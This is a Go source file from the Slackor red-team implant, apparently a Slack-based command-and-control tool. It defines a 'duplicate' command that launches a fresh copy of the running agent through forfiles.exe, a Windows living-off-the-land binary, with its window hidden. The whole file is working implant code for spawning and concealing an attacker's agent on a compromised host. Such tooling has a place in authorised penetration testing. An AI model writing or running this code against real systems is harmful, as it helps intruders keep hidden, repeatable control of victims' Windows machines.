// +build windows

package windows

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Duplicate spawns a new agent using forfiles.exe
type Duplicate struct{}

// Name is the name of the command
func (d Duplicate) Name() string {
	return "duplicate"
}

// Run spawns a new agent using forfiles.exe
func (d Duplicate) Run(clientID string, jobID string, args []string) (string, error) {
	cmdName := "forfiles.exe"
	cmd := exec.Command(cmdName)
	cmdArgs := []string{"/p", `c:\windows\system32`, "/m", "svchost.exe", "/c", os.Args[0]}
	cmd = exec.Command(cmdName, cmdArgs...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Duplicated %s.", os.Args[0]), nil
}

func init() {
	command.RegisterCommand(Duplicate{})
}
